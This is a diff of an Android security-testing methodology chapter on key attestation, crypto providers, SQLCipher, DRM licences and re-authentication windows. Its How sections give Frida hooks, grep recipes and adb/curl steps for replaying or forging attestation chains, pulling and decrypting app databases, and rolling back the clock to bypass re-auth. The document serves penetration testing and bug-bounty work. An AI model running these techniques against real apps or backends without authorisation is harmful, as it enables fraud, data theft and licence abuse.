-| **Maps to** | `developer.android.com/privacy-and-security/security-key-attestation` — "Perform verification on a **separate server**, not on the device itself"; the requirements list (root signed with the Google attestation root key, `attestationSecurityLevel` of `TrustedEnvironment` or `StrongBox`, all signatures verified, no certificate in the CRL, "Validation performed on trusted server, not on device"); the official verifier at github.com/android/keyattestation |
+| **Requires** | backend-api, mitm |
+| **Maps to** | MASTG-KNOW-0044 (Key Attestation); `developer.android.com/privacy-and-security/security-key-attestation` — "Perform verification on a **separate server**, not on the device itself"; the requirements list (root signed with the Google attestation root key, `attestationSecurityLevel` of `TrustedEnvironment` or `StrongBox`, all signatures verified, no certificate in the CRL, "Validation performed on trusted server, not on device"); the official verifier at github.com/android/keyattestation |
 
 - **Test:** The whole point of attestation is that the device may be compromised. Verification performed
   in the app — parsing the chain in Java/Kotlin and branching locally — is defeated by one Frida line.
 - **How:**
 ```bash
-grep -rn 'setAttestationChallenge\|getCertificateChain\|attestationSecurityLevel\|1\.3\.6\.1\.4\.1\.11129\.2\.1\.17' out/sources/
+grep -rn 'setAttestationChallenge\|getCertificateChain\|attestationSecurityLevel\|1\.3\.6\.1\.4\.1\.11129\.2\.1\.17' $DEC/jadx/sources/
 ```
   Then decide it empirically: does the DER-encoded chain appear in an outbound request in Burp, or only a
   boolean?
@@ -2373,7 +2487,9 @@ Java.perform(function () {
   still accepts. Or, with the hook, attestation-gated functionality unlocking on a rooted or emulated
   device.
 - **Escalation:** → D21 (full RASP bypass), D23 (fraud controls that rested on it). The device-integrity
-  control is decorative and every downstream decision built on it is void.
+  control is decorative and every downstream decision built on it is void. Verifier probes against the backend:
+  owner D22-067 (and D21-026 for the boolean-instead-of-chain shape) — D12 keeps the client-side hook and the
+  `SOFTWARE`-chain source; cite their logs rather than re-running the server half.
 - **Ruled out when:** The full DER chain leaves the device on every enrolment and the server's response
   changes when you tamper with the chain — verified by submitting a chain with a modified
   `attestationSecurityLevel` and observing a distinct rejection body.
@@ -2386,14 +2502,15 @@ Java.perform(function () {
 | **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when attestation gates enrolment or payment provisioning; `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies) otherwise |
 | **Attacker** | AM-01 |
 | **Applies to** | all attestation deployments |
-| **Maps to** | `developer.android.com/privacy-and-security/security-key-attestation` verification checklist item "`attestationChallenge` matches your nonce"; `KeyDescription.attestationChallenge` in source.android.com/docs/security/features/keystore/attestation |
+| **Requires** | backend-api, mitm |
+| **Maps to** | MASTG-KNOW-0044 (Key Attestation); `developer.android.com/privacy-and-security/security-key-attestation` verification checklist item "`attestationChallenge` matches your nonce"; `KeyDescription.attestationChallenge` in source.android.com/docs/security/features/keystore/attestation |
 
 - **Test:** `setAttestationChallenge()` must carry a fresh, server-issued, single-use value. A constant, a
   client-generated UUID or a timestamp means one genuine attestation can be replayed forever — including
   from an emulator or from a different device entirely.
 - **How:**
 ```bash
-grep -rn -B6 -A6 'setAttestationChallenge(' out/sources/    # is the argument a constant, a UUID, a timestamp?
+grep -rn -B6 -A6 'setAttestationChallenge(' $DEC/jadx/sources/    # is the argument a constant, a UUID, a timestamp?
 ```
   Capture two enrolments and diff the challenge; then replay a previously captured chain from a different
   install:
@@ -2417,7 +2534,8 @@ curl -s -X POST https://api.target/v1/enrol -H 'Content-Type: application/json' 
 | **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
 | **Attacker** | AM-01 |
 | **Applies to** | every server that consumes Android key attestation |
-| **Maps to** | `developer.android.com/privacy-and-security/security-key-attestation`, verbatim: "**Critical**: Only trust the **first occurrence** of the extension (nearest to root). Extensions in the leaf certificate may have been added by attackers"; and "Don't assume the key attestation extension is in the leaf certificate" |
+| **Requires** | backend-api, mitm |
+| **Maps to** | MASTG-KNOW-0044 (Key Attestation); `developer.android.com/privacy-and-security/security-key-attestation`, verbatim: "**Critical**: Only trust the **first occurrence** of the extension (nearest to root). Extensions in the leaf certificate may have been added by attackers"; and "Don't assume the key attestation extension is in the leaf certificate" |
 
 - **Test:** If the server does verify, check *which* certificate it parses the extension from. Trusting the
   leaf lets anyone who can mint a leaf inject arbitrary claims — security level, boot state, application id.
@@ -2425,8 +2543,8 @@ curl -s -X POST https://api.target/v1/enrol -H 'Content-Type: application/json' 
 ```bash
 # split the chain and show which certificates carry the extension
 openssl crl2pkcs7 -nocrl -certfile chain.pem | openssl pkcs7 -print_certs -out certs.pem
-csplit -z -f cert- certs.pem '/-----BEGIN CERTIFICATE-----/' '{*}'
-for c in cert-*; do echo "== $c"; openssl x509 -in $c -text -noout | grep -c '1.3.6.1.4.1.11129.2.1.17'; done
+awk '/-----BEGIN CERTIFICATE-----/{n++} {print > ("cert-" n ".pem")}' certs.pem   # portable split (BSD csplit has no -z)
+for c in cert-*.pem; do echo "== $c"; openssl x509 -in $c -text -noout | grep -c '1.3.6.1.4.1.11129.2.1.17'; done
 ```
   Then submit a chain with an attacker-added leaf carrying a forged `KeyDescription` and see whether the
   server honours it. Newer chains also carry a CBOR **provisioning information** extension that must be
@@ -2447,7 +2565,8 @@ for c in cert-*; do echo "== $c"; openssl x509 -in $c -text -noout | grep -c '1.
 | **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies); `cryptographic_weakness.use_of_expired_cryptographic_key_or_cert` (P4) for the expiry half |
 | **Attacker** | AM-01 |
 | **Applies to** | all attestation verifiers |
-| **Maps to** | `developer.android.com/privacy-and-security/security-key-attestation` — CRL at `https://android.googleapis.com/attestation/status` with `status` values `REVOKED`/`SUSPENDED` and `reason` values `UNSPECIFIED`/`KEY_COMPROMISE`/`CA_COMPROMISE`/`SUPERSEDED`/`SOFTWARE_FLAW`; root list at `https://android.googleapis.com/attestation/root`; `attestationSecurityLevel` ∈ `SOFTWARE`/`TRUSTED_ENVIRONMENT`/`STRONGBOX`; `SecurityLevel` `Software` means only "secure as long as the device's Android system complies with the Android Platform Security Model" |
+| **Requires** | backend-api, mitm |
+| **Maps to** | MASTG-KNOW-0044 (Key Attestation); `developer.android.com/privacy-and-security/security-key-attestation` — CRL at `https://android.googleapis.com/attestation/status` with `status` values `REVOKED`/`SUSPENDED` and `reason` values `UNSPECIFIED`/`KEY_COMPROMISE`/`CA_COMPROMISE`/`SUPERSEDED`/`SOFTWARE_FLAW`; root list at `https://android.googleapis.com/attestation/root`; `attestationSecurityLevel` ∈ `SOFTWARE`/`TRUSTED_ENVIRONMENT`/`STRONGBOX`; `SecurityLevel` `Software` means only "secure as long as the device's Android system complies with the Android Platform Security Model" |
 
 - **Test:** Verifiers commonly (a) skip the revocation list, (b) accept `attestationSecurityLevel = SOFTWARE`,
   and (c) do not check certificate validity at all.
@@ -2463,7 +2582,8 @@ openssl crl2pkcs7 -nocrl -certfile chain.pem | openssl pkcs7 -print_certs -text 
 - **Proof:** The backend returning "attested / trusted" for a chain with `SOFTWARE` security level or with
   a revoked serial — with both request and response bodies in the report.
 - **Escalation:** → D21/D15. An attestation accepted from a device with no hardware root of trust defeats
-  every downstream anti-fraud control.
+  every downstream anti-fraud control. Verifier probes: owner D22-067 / D21-026 — D12-066 contributes the `SOFTWARE`
+  chain (D12-077) and the CRL serial; whichever runs second is `covered-by`.
 - **Ruled out when:** The backend rejects `SOFTWARE` chains and CRL-listed serials with distinct bodies,
   and the chain terminates at a certificate in the published root list. **The emulator is the ideal source
   of a `SOFTWARE` chain for this test — that is the one legitimate use of the artefact D12-077 forbids you
@@ -2477,7 +2597,8 @@ openssl crl2pkcs7 -nocrl -certfile chain.pem | openssl pkcs7 -print_certs -text 
 | **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies) |
 | **Attacker** | AM-01 (from a bootloader-unlocked device) |
 | **Applies to** | **Android 7.0+** for the fields; **Android 10+** for the VBMeta digest |
-| **Maps to** | source.android.com/docs/security/features/keystore/attestation — `RootOfTrust` contains `verifiedBootKey`, `deviceLocked`, `verifiedBootState` (`Verified`, `SelfSigned`, `Unverified`, `Failed`), `verifiedBootHash`; AOSP security-model §4.7: "the Verified Boot state is included in key attestation certificates … in the `deviceLocked` and `verifiedBootState` fields, which can be verified by apps as well as passed onto backend services to remotely verify boot integrity"; from Android 10 with AVB2 "the VBMeta struct digest … is included in key attestation certificates to support firmware transparency" |
+| **Requires** | backend-api, mitm, physical |
+| **Maps to** | MASTG-KNOW-0044 (Key Attestation); source.android.com/docs/security/features/keystore/attestation — `RootOfTrust` contains `verifiedBootKey`, `deviceLocked`, `verifiedBootState` (`Verified`, `SelfSigned`, `Unverified`, `Failed`), `verifiedBootHash`; AOSP security-model §4.7: "the Verified Boot state is included in key attestation certificates … in the `deviceLocked` and `verifiedBootState` fields, which can be verified by apps as well as passed onto backend services to remotely verify boot integrity"; from Android 10 with AVB2 "the VBMeta struct digest … is included in key attestation certificates to support firmware transparency" |
 
 - **Test:** A verified attestation carries the boot state. Check that the server actually gates on it — an
   unlocked bootloader (`deviceLocked=false`, `verifiedBootState` `Unverified`/`SelfSigned`) is precisely
@@ -2505,7 +2626,7 @@ curl -s -X POST https://api.target/v1/provision -H 'Content-Type: application/js
 | **Attacker** | AM-11/AM-12 for the relay, AM-01 for the consequence |
 | **Applies to** | apps that treat an Android Keystore X.509 attestation chain as a device-integrity boolean |
 | **Requires** | backend-api, mitm, physical |
-| **Maps to** | HackTricks `play-integrity-attestation-bypass.md` "Hardware Attestation Clean-Device Relay", citing the Quarkslab research and demo repository, Guardsquare's key-attestation relay work, and the AOSP key/ID attestation docs |
+| **Maps to** | MASTG-KNOW-0044 (Key Attestation); HackTricks `play-integrity-attestation-bypass.md` "Hardware Attestation Clean-Device Relay", citing the Quarkslab research and demo repository, Guardsquare's key-attestation relay work, and the AOSP key/ID attestation docs |
 
 - **Test:** The extension proves that *some* acceptable TEE/StrongBox generated the leaf key for that
   challenge. It does **not** bind that hardware to the process or the network session presenting the chain.
@@ -2526,7 +2647,7 @@ curl -s -X POST https://api.target/v1/provision -H 'Content-Type: application/js
   - The controller must **always** post a `response` (even an empty array after an HTTP error) or `op.wait()`
     deadlocks the app thread.
 ```bash
-grep -rn 'attestationApplicationId\|\[709\]\|709' out/sources/ | head        # does anything parse tag 709?
+grep -rn 'attestationApplicationId\|\[709\]\|709' $DEC/jadx/sources/ | head        # does anything parse tag 709?
 ```
 - **Proof:** The backend accepting an attestation chain generated on a different, clean device while the app
   runs on a rooted one.
@@ -2548,7 +2669,7 @@ grep -rn 'attestationApplicationId\|\[709\]\|709' out/sources/ | head        # d
 | **Attacker** | AM-01 |
 | **Applies to** | attestation verifiers; device-side behaviour differs on **Android 15** (RKP optional) versus **Android 16** (RKP only, factory keys phased out) |
 | **Requires** | backend-api, mitm |
-| **Maps to** | `developer.android.com/privacy-and-security/security-key-attestation` — a new EC-based root certificate signs attestation chains starting **1 February 2026**, alongside the existing root with `SERIALNUMBER=f92009e853b6b045` (valid 2022-03-20 to 2042-03-15); "Android 15+: RKP support is optional. Android 16+: Only RKP is supported; factory keys are phased out"; "RKP certificates must have validity periods checked"; "Pre-2021 devices have attestation keys with expired certificates, but remain trustworthy unless in the CRL" |
+| **Maps to** | MASTG-KNOW-0044 (Key Attestation); `developer.android.com/privacy-and-security/security-key-attestation` — a new EC-based root certificate signs attestation chains starting **1 February 2026**, alongside the existing root with `SERIALNUMBER=f92009e853b6b045` (valid 2022-03-20 to 2042-03-15); "Android 15+: RKP support is optional. Android 16+: Only RKP is supported; factory keys are phased out"; "RKP certificates must have validity periods checked"; "Pre-2021 devices have attestation keys with expired certificates, but remain trustworthy unless in the CRL" |
 
 - **Test:** Two moving parts. A verifier that pins only the old root is about to break; a verifier that
   skips validity checks "because pre-2021 devices have expired factory keys anyway" is already accepting
@@ -2576,6 +2697,7 @@ openssl crl2pkcs7 -nocrl -certfile chain.pem | openssl pkcs7 -print_certs -text 
 | **VRT** | `cryptographic_weakness.broken_cryptography.use_of_vulnerable_cryptographic_library` (P4) |
 | **Attacker** | AM-01 |
 | **Applies to** | apps targeting **Android 9 (API 28)+ fail** when a provider is specified. The `Crypto` provider was deprecated in **Android 7.0 (API 24)** and removed in **Android 9 (API 28)**; **BouncyCastle** was deprecated in Android 9 and removed in **Android 12 (API 31)** — flag BKS keystore use as **LEGACY** |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0312, MASWE-0007, MASTG-KNOW-0011 (Security Provider), MASTG-BEST-0020, rule `mastg-android-hardcoded-security-provider` |
 
 - **Test:** Naming a provider is a compatibility and a security problem: providers have been removed, the
@@ -2583,16 +2705,28 @@ openssl crl2pkcs7 -nocrl -certfile chain.pem | openssl pkcs7 -print_certs -text 
   refuses.
 - **How:**
 ```bash
-semgrep -c rules/mastg-android-hardcoded-security-provider.yaml out/sources/
-grep -rnE 'getInstance\([^)]*,\s*"(BC|BouncyCastle|Crypto|SC|SunJCE|Conscrypt|AndroidOpenSSL)"' out/sources/
-grep -rn 'Security\.addProvider\|Security\.insertProviderAt\|KeyStore\.getInstance\("BKS"\)' out/sources/
+semgrep --no-git-ignore --metrics=off -c "$MASTG_RULES"/mastg-android-hardcoded-security-provider.yaml "$DEC/jadx/sources"   # --no-git-ignore: a gitignored decompiled tree otherwise scans 1 file and exits 0 (D12-001)
+grep -rnE 'getInstance\([^)]*,\s*"(BC|BouncyCastle|Crypto|SC|SunJCE|Conscrypt|AndroidOpenSSL)"' $DEC/jadx/sources/
+grep -rn 'Security\.addProvider\|Security\.insertProviderAt\|KeyStore\.getInstance\("BKS"\)' $DEC/jadx/sources/
 unzip -l base.apk | grep -iE 'bcprov|bcpkix|spongycastle'
 unzip -p base.apk 'META-INF/*.version' | grep -i -A1 -B1 castle
 ```
+  Runtime half (was D12-071 — merged here so the finding is written once): the provider ORDER, which decides whether
+  the process opted out of the Conscrypt Mainline updates for every operation including TLS:
+```javascript
+Java.perform(function () {
+  var S = Java.use('java.security.Security');
+  var p = S.getProviders();
+  for (var i = 0; i < p.length; i++) console.log(i + ': ' + p[i].getName() + ' ' + p[i].getVersion());
+});
+```
 - **Proof:** The `getInstance(..., "<provider>")` call site with a provider other than `AndroidKeyStore` on
-  a `KeyStore` call, **plus** the bundled provider's version and the weak primitive it actually supplies.
+  a `KeyStore` call, **plus** the bundled provider's version and the weak primitive it actually supplies; for the
+  ordering half, the runtime provider list with the shipped provider at index 0 ahead of `AndroidOpenSSL`/Conscrypt.
 - **Escalation:** A bundled crypto library shipping its own provider is also a D17 supply-chain item —
-  check the coordinate against OSV/GHSA. Weak provider → weak primitive → D12-014/D12-015.
+  check the coordinate against OSV/GHSA. Weak provider → weak primitive → D12-014/D12-015; → D14 when the app's TLS
+  now diverges from platform policy (its own provider may negotiate TLS 1.0/1.1 the platform refuses). **Owner for
+  the bundled-provider finding across chapters: D22-017** — D12-021 and D12-071 point here; file it once.
 - **Ruled out when:** Every `getInstance` is provider-less (the maintained default is `AndroidOpenSSL` /
   Conscrypt) except `KeyStore.getInstance("AndroidKeyStore")`. **Rating honesty:** on its own this is often
   Informational under HackerOne rating — escalate only when the named provider is a known-weak one *and*
@@ -2606,29 +2740,19 @@ unzip -p base.apk 'META-INF/*.version' | grep -i -A1 -B1 castle
 | **VRT** | `cryptographic_weakness.broken_cryptography.use_of_vulnerable_cryptographic_library` (P4) |
 | **Attacker** | AM-06/AM-01 |
 | **Applies to** | Conscrypt APEX from **Android 10**; Android 15 disallows TLS 1.0/1.1 for apps targeting it |
+| **Requires** | — |
 | **Maps to** | AOSP Conscrypt module — provides the TLS and JCA providers, embeds BoringSSL (NIST CMVP validated), ships as the `com.android.conscrypt` APEX and updates independently of OS releases |
 
-- **Test:** Conscrypt is Mainline-updated. An app that inserts its own provider at position 1 opts out of
-  those security updates for **every** crypto operation in the process, including TLS.
-- **How:**
-```bash
-grep -rnE 'Security\.insertProviderAt|Security\.addProvider|new BouncyCastleProvider|org\.spongycastle|Conscrypt\.newProvider|removeProvider' out/sources/
-unzip -l base.apk | grep -iE 'bcprov|spongycastle|conscrypt'
-```
-```javascript
-Java.perform(function () {
-  var S = Java.use('java.security.Security');
-  var p = S.getProviders();
-  for (var i = 0; i < p.length; i++) console.log(i + ': ' + p[i].getName() + ' ' + p[i].getVersion());
-});
-```
-- **Proof:** The provider list with a shipped BouncyCastle at index 0 ahead of `AndroidOpenSSL`/Conscrypt,
-  plus the bundled `bcprov` version being an old release with a citable advisory.
-- **Escalation:** → D14 — the app's TLS behaviour now diverges from platform policy; its own provider may
-  still negotiate TLS 1.0/1.1 that the platform refuses.
-- **Ruled out when:** The provider list shows `AndroidOpenSSL`/Conscrypt at index 0, or the app installs
-  Conscrypt explicitly via `Conscrypt.newProvider()` (a *correct* pattern — Google Play Services provider
-  installation), not a bundled legacy provider.
+- **Test:** Cross-reference only — the runtime provider-order half of the bundled-provider finding now lives in
+  D12-070 (its `Security.getProviders()` script is the Proof of ordering); this id is kept so references do not churn.
+  Conscrypt is Mainline-updated: a provider inserted at position 1 opts the process out of those updates for every
+  crypto operation including TLS. Owner for the bundled-provider finding across chapters: D22-017.
+- **How:** run D12-070 once (static greps + the provider-list script) and record this row as `covered-by D12-070` with
+  its log path.
+- **Proof:** as D12-070 (the provider list with a shipped provider at index 0).
+- **Escalation:** as D12-070 (→ D14 for the TLS divergence, → D22-017 as the owner).
+- **Ruled out when:** D12-070 is settled: `AndroidOpenSSL`/Conscrypt at index 0, or Conscrypt installed explicitly via
+  `Conscrypt.newProvider()` (a *correct* pattern), not a bundled legacy provider.
 
 ### D12-072 · Bundled OpenSSL or SQLCipher crypto version
 
@@ -2658,7 +2782,7 @@ strings -a x/lib/*/libsqlcipher*.so | grep -aiE 'OpenSSL [0-9.]+[a-z]?|SQLCipher
 ```javascript
 var m = Process.getModuleByName('libagora-rtc-sdk.so');
 ['SSL_connect','EVP_EncryptInit_ex'].forEach(function (s) {
-  var a = Module.findExportByName(m.name, s);
+  var a = m.findExportByName(s);          // instance method — the static Module.findExportByName(name, s) was removed in Frida 17
   if (a) Interceptor.attach(a, { onEnter: function () { console.log('[reached] ' + s + ' in ' + m.name); } });
 });
 ```
@@ -2684,15 +2808,15 @@ var m = Process.getModuleByName('libagora-rtc-sdk.so');
 | **Attacker** | AM-03 with a read primitive; AM-01 if the passphrase is a constant shared across installs |
 | **Applies to** | apps using `android-database-sqlcipher` / `androidx-database-sqlcipher` |
 | **Requires** | device |
-| **Maps to** | cross-reference to D11; the passphrase derivation is the D12 half |
+| **Maps to** | MASTG-KNOW-0038 (SQLCipher Database); cross-reference to D11; the passphrase derivation is the D12 half |
 
 - **Test:** The encryption is only as strong as the passphrase source. A literal, a device-id derivation or
   a trivially-derived value makes at-rest encryption decorative.
 - **How:**
 ```bash
-grep -rn 'net\.sqlcipher\|SupportFactory(\|openOrCreateDatabase(\|getWritableDatabase("' out/sources/ -B6 -A6
-grep -rn "SupportFactory(\|getBytes()\|openOrCreateDatabase(.*\"" out/sources/ | grep -i cipher
-adb shell run-as com.target.app sh -c 'cat databases/app.db' > app.db
+grep -rn 'net\.sqlcipher\|SupportFactory(\|openOrCreateDatabase(\|getWritableDatabase("' $DEC/jadx/sources/ -B6 -A6
+grep -rn "SupportFactory(\|getBytes()\|openOrCreateDatabase(.*\"" $DEC/jadx/sources/ | grep -i cipher
+adb exec-out "$AS 'cat /data/data/$PKG/databases/app.db'" > app.db   # exec-out: binary-safe (adb shell mangles the DB)
 sqlcipher app.db <<'SQL'
 PRAGMA key = '<recovered passphrase>';
 PRAGMA cipher_compatibility = 4;
@@ -2723,9 +2847,9 @@ SQL
   another install or account, or it survives subscription cancellation.
 - **How:**
 ```bash
-grep -rnE 'setKeySetId|OfflineLicenseHelper|DownloadHelper|DefaultDrmSessionManager|downloadLicense|releaseLicense|renewLicense|setMultiSession' out/sources/
-adb shell run-as com.target.app sh -c "find . -path '*download*' -o -name '*.exo' -o -name 'downloads*'"
-adb shell run-as com.target.app sh -c "sqlite3 databases/exoplayer_internal.db 'select * from ExoPlayerDownloads;'"
+grep -rnE 'setKeySetId|OfflineLicenseHelper|DownloadHelper|DefaultDrmSessionManager|downloadLicense|releaseLicense|renewLicense|setMultiSession' $DEC/jadx/sources/
+adb shell "$AS 'find /data/data/$PKG -path \"*download*\" -o -name \"*.exo\" -o -name \"downloads*\"'"
+adb exec-out "$AS 'cat /data/data/$PKG/databases/exoplayer_internal.db'" > exo.db && sqlite3 exo.db 'select * from ExoPlayerDownloads;'   # pull, query on the host — sqlite3 is absent on stock devices
 # copy the media + keySetId to a second device/account and play with the network disabled
 ```
 - **Proof:** Downloaded content playing on a second device or under a cancelled or free account using the
@@ -2751,7 +2875,7 @@ adb shell run-as com.target.app sh -c "sqlite3 databases/exoplayer_internal.db '
   boundary. Does the app surface a key change, and can another app read or write entries?
 - **How:**
 ```bash
-grep -rn 'E2eeContactKeysManager\|updateOrInsertE2eeContactKey\|getE2eeContactKey\|updateE2eeContactKeyLocalVerificationState' out/sources/
+grep -rn 'E2eeContactKeysManager\|updateOrInsertE2eeContactKey\|getE2eeContactKey\|updateE2eeContactKeyLocalVerificationState' $DEC/jadx/sources/
 adb shell dumpsys contacts | grep -i 'e2ee\|contact_keys' 2>/dev/null
 ```
   Perform an out-of-band key rotation for a contact and observe whether the app warns.
@@ -2777,8 +2901,8 @@ adb shell dumpsys contacts | grep -i 'e2ee\|contact_keys' 2>/dev/null
   passphrase drawn from a space large enough to resist recovery?
 - **How:**
 ```bash
-grep -rniE 'e2ee|endToEnd|publicKey|fingerprint|safetyNumber|verifyKey|trustOnFirstUse|TOFU' out/sources/ -B6 -A6
-grep -rn 'generatePassword\|mnemonic\|wordlist\|BIP39\|randomPassword' out/sources/ -B6 -A10   # count the space
+grep -rniE 'e2ee|endToEnd|publicKey|fingerprint|safetyNumber|verifyKey|trustOnFirstUse|TOFU' $DEC/jadx/sources/ -B6 -A6
+grep -rn 'generatePassword\|mnemonic\|wordlist\|BIP39\|randomPassword' $DEC/jadx/sources/ -B6 -A10   # count the space
 ```
   Serve a substituted public key from a proxy and see whether the client notices; and enumerate the
   passphrase generator's space directly from the wordlist and the length constant.
@@ -2799,6 +2923,7 @@ grep -rn 'generatePassword\|mnemonic\|wordlist\|BIP39\|randomPassword' out/sourc
 | **VRT** | n/a — this is a false-positive suppression rule |
 | **Attacker** | AM-12 (harness) |
 | **Applies to** | every emulator-based harness. **The caveat is absolute** |
+| **Requires** | — |
 | **Maps to** | source.android.com/docs/security/features/keystore/attestation `SecurityLevel` values (`Software`, `TrustedEnvironment`, `StrongBox`); `developer.android.com/privacy-and-security/security-key-attestation` ("check that `attestationSecurityLevel` is set to `TrustedEnvironment` or `StrongBox`"); `privacy-and-security/keystore` (probe `PackageManager.FEATURE_STRONGBOX_KEYSTORE`) |
 
 - **Test:** On a standard AVD the Keystore is software-backed and the attestation chain terminates in
@@ -2812,6 +2937,12 @@ grep -rn 'generatePassword\|mnemonic\|wordlist\|BIP39\|randomPassword' out/sourc
 adb shell getprop ro.kernel.qemu; adb shell getprop ro.hardware; adb shell getprop ro.product.model
 adb shell pm list features | grep -iE 'strongbox|hardware_keystore'
 # expect android.hardware.strongbox_keystore ABSENT on a stock AVD
+# harness setup (was D12-078): an auth-bound key CANNOT be generated on a device with no secure lock — set a PIN first and assert the keyguard
+adb shell locksettings set-pin 1234
+assert_kg () { local kg; kg=$(adb shell dumpsys activity activities | grep -oE 'mKeyguardShowing=(true|false)' | head -1)
+  [ -n "$kg" ] || { echo 'KEYGUARD STATE UNREADABLE — fix the probe before trusting any beat' >&2; return 1; }; echo "$kg"; }
+assert_kg || exit 1     # current builds do not emit isKeyguardShowing= in dumpsys window; an empty probe is not a pass
+# retry the flow: the identical generation call now succeeds — that is a harness fact, not a finding (D12-078)
 ```
   Then re-run the D12-004 `KeyInfo` script on a **physical device** and compare. The device-capability
   matrix to publish in the methodology section:
@@ -2842,18 +2973,17 @@ Emulator IS authoritative for:
 | **VRT** | n/a — prevents a fabricated crypto finding |
 | **Attacker** | AM-12 (harness) |
 | **Applies to** | all emulator work |
+| **Requires** | — |
 | **Maps to** | the emulator-artefact rule; `KeyguardManager.isDeviceSecure` |
 
-- **Test:** A key with `setUserAuthenticationRequired(true)` **cannot be generated** on a device with no
-  secure lock. "Key generation throws on a fresh emulator" is a test-environment problem, not a finding.
-- **How:**
-```bash
-adb shell locksettings set-pin 1234
-adb shell dumpsys window | grep -oE 'isKeyguardShowing=(true|false)'
-# retry the flow; the same generation call now succeeds
-```
+- **Test:** Cross-reference only — this harness rule is a subset of D12-077's Test paragraph and its setup step now
+  lives there (set a PIN, assert the keyguard with a probe that prints a value). A key with
+  `setUserAuthenticationRequired(true)` **cannot be generated** on a device with no secure lock; "key generation
+  throws on a fresh emulator" is a test-environment problem, not a finding.
+- **How:** run the D12-077 harness-setup block (`locksettings set-pin 1234` + `assert_kg`) before any Keystore auth work
+  and record this row as `covered-by D12-077`.
 - **Proof:** The identical generation call succeeding once a PIN is set, captured in the same session as
-  the earlier failure.
+  the earlier failure (recorded under D12-077).
 - **Escalation:** Once the PIN is set you can run the D12-049 auth-window differential and the D12-050
   enrolment test properly. **Do not confuse this with D12-053** — that item is about the *app's fallback*
   when generation fails on a real user's lock-less device, which is a genuine finding; this item is about
@@ -2868,6 +2998,7 @@ adb shell dumpsys window | grep -oE 'isKeyguardShowing=(true|false)'
 | **VRT** | n/a (severity governance for the whole chapter) |
 | **Attacker** | AM-12 (discipline) |
 | **Applies to** | every item in this chapter |
+| **Requires** | — |
 | **Maps to** | the 7-Question Gate (Q6: "prove impact beyond technically possible" — failing Q6 downgrades rather than kills); HackerOne Core Ineligible ("Optional security hardening steps / Missing best practices"); Google Mobile VRP non-qualifying "Hardcoded API keys"; Basecamp's exclusion and its escape hatch |
 
 - **Test:** Before filing anything from this chapter, answer three questions in writing. **(1)** What is the
@@ -2898,6 +3029,7 @@ adb shell dumpsys window | grep -oE 'isKeyguardShowing=(true|false)'
 | **VRT** | n/a (reporting governance — see D27) |
 | **Attacker** | AM-12 (discipline) |
 | **Applies to** | every multi-step crypto finding |
+| **Requires** | — |
 | **Maps to** | the Pre-Severity Gate; chain-filing order; evidence hygiene; retraction discipline |
 
 - **Test:** Crypto findings are almost always chains — extract key → decrypt store → replay token → reach
@@ -2928,6 +3060,108 @@ adb shell dumpsys window | grep -oE 'isKeyguardShowing=(true|false)'
   screenshots, the appendix.
 - **Escalation:** n/a.
 - **Ruled out when:** n/a — apply always.
+
+### D12-081 · App-side re-authentication window measured on the wall clock — the clock-rollback differential
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.long_timeout` (P5) as a bare timeout; exit via `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies) when the window gates a key-backed action, or `broken_authentication_and_session_management.authentication_bypass` (P1) when it releases a session or a payment |
+| **Attacker** | AM-11 physical unlocked (Settings → Date & time, automatic time off); AM-03/AM-08 can read the stored timestamp but cannot set the clock (`SET_TIME` is signature\|privileged) |
+| **Applies to** | apps that persist a "last authenticated / last unlocked" timestamp and compare it to a TTL in app code |
+| **Requires** | device, biometric |
+| **Maps to** | MASWE-0023; `developer.android.com/privacy-and-security/keystore` (`TAG_AUTH_TIMEOUT` is enforced on the secure hardware's own clock, which `set-time` cannot move); D12-049 |
+| **Record** | `logs/D12-081.txt`: the timestamp's owner (prefs key / DataStore / DB column), the TTL constant, the clock API compared against (`currentTimeMillis` vs `elapsedRealtime`), the outcome of the three beats |
+
+- **Skip when:** the only re-auth window is a Keystore `TAG_AUTH_TIMEOUT` (D12-049) and no app code compares a stored timestamp to a TTL — write `n/a — D12-081: no app-side lastAuth/TTL comparison (grep <date>)`.
+- **Test:** D12-049 proves the Keystore window; this item proves the app's own. A gate written as `now - lastAuth < TTL` over `System.currentTimeMillis()` is extended indefinitely by moving the clock back; over `SystemClock.elapsedRealtime()` it fails closed on reboot, which is the correct shape.
+- **How:**
+```bash
+grep -rnE 'currentTimeMillis\(\)|elapsedRealtime\(\)|Instant\.now\(\)' $DEC/jadx/sources -B6 -A6 | grep -inE 'lastAuth|lastUnlock|authenticatedAt|unlockedAt|reauth|pinVerified|biometricAt|ttl|expir'
+# find the persisted value and its owner (rooted harness; quote for the DEVICE shell)
+adb shell "$AS 'grep -rlE \"(last|auth|unlock)[A-Za-z_]*(At|Time|Ts|Millis)\" /data/data/$PKG/shared_prefs /data/data/$PKG/files /data/data/$PKG/databases 2>/dev/null'"
+now_ms () { python3 -c 'import time;print(int(time.time()*1000))'; }
+# beat 1 (positive control): authenticate, note T0, jump the clock PAST the window -> the prompt must reappear
+adb shell "cmd alarm set-time $(( $(now_ms) + TTL_MS + 60000 ))"
+# beat 2: set the clock BACK to T0+1s, trigger the protected action -> no prompt and an unchanged stored timestamp = the finding
+adb shell "cmd alarm set-time $T0_PLUS_1S_MS"
+# beat 3 (negative control): a Keystore key with authTimeout N under the same clock moves still throws UserNotAuthenticatedException (D12-049)
+```
+- **Proof:** the three beats in one take — forward jump → prompt (control); backward jump → protected action proceeds with no prompt, stored timestamp unchanged; the Keystore-bound operation under the same manipulation still refuses — with the Settings clock visible in the recording and the stored value before/after.
+- **Escalation:** → D13 (step-up defeated), D23 (payment without re-auth); pair with D12-048 when the "protected" key is not auth-bound at all.
+- **Ruled out when:** the window is enforced by Keystore `TAG_AUTH_TIMEOUT` (D12-004 shows a positive timeout and beat 2 refuses), or the app compares `SystemClock.elapsedRealtime()` or a server-issued expiry, and the clock-back beat still prompts.
+
+### D12-082 · `AUTH_DEVICE_CREDENTIAL` accepted on a key the UX presents as biometric — the PIN downgrade
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium |
